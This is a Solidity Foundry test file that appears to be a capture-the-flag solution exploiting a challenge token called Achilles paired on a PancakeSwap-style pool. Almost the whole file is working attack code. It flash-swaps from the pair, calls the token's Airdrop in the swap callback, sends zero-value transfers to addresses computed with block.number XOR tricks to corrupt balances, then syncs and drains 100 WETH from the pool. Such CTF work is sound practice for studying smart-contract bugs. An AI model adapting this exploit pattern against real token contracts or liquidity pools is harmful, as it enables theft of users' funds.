// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "forge-std/console.sol";

import "./SetUp.sol";

contract ContractTest is Test {
    SetUp public setup = new SetUp();
    Achilles public achilles = Achilles(setup.achilles());
    PancakePair public pair = PancakePair(setup.pair());
    WETH public weth = WETH(setup.weth());
    address public yourAddress = setup.yourAddress();

    function testExp() public {
        go();
        go1();
        go2();
        getflag();
    }

    function go() public {
        pair.swap(900 ether, 0, address(this), bytes("0x001"));
    }

    function go1() public {
        address to = address(uint160((uint160(address(this)) | block.number) ^ (uint160(address(this)) ^ uint160(address(pair)))));
        achilles.transfer(to, 0);

        to = address(uint160((uint160(address(this)) | block.number) ^ (uint160(address(this)) ^ uint160(address(this)))));
        achilles.transfer(to, 0);
    }

    function go2() public {
        pair.sync();

        achilles.transfer(address(pair), 1);
        pair.swap(0, 100 ether, address(this), bytes("0x"));
    }

    function getflag() public {
        weth.transfer(yourAddress, 100 ether);
        require(setup.isSolved());
    }

    function pancakeCall(address sender, uint amount0, uint amount1, bytes calldata data) external {  
        achilles.Airdrop(1);
        achilles.transfer(address(pair), amount0);
    }
}
